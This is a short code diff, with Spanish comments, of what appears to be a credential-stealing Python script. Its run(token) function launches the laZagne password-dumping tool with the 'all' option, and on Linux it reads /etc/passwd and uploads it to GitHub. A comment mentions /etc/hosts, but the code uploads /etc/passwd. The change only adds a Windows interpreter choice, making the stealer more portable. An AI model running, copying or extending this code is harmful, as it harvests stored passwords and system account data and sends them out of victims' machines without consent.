@@ -86,7 +86,8 @@ def run(token):
     
     # Ejecutar el archivo con el argumento "all"
     print('[!] Ejecutando laZagne.py')
-    result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "all"], capture_output=True, text=True)
+    python_command = "python" if path == "Windows" else "python3"
+    result = subprocess.run([python_command, os.path.join(path, 'laZagne.py'), "all"], capture_output=True, text=True)
     
     # Eliminar output.txt si existe
     output_filename = 'output.txt'
@@ -103,6 +104,5 @@ def run(token):
     # Leer /etc/hosts y subirlo a GitHub
     if path == 'Linux':
         catAndUpload('/etc/passwd', token)
-
 
 
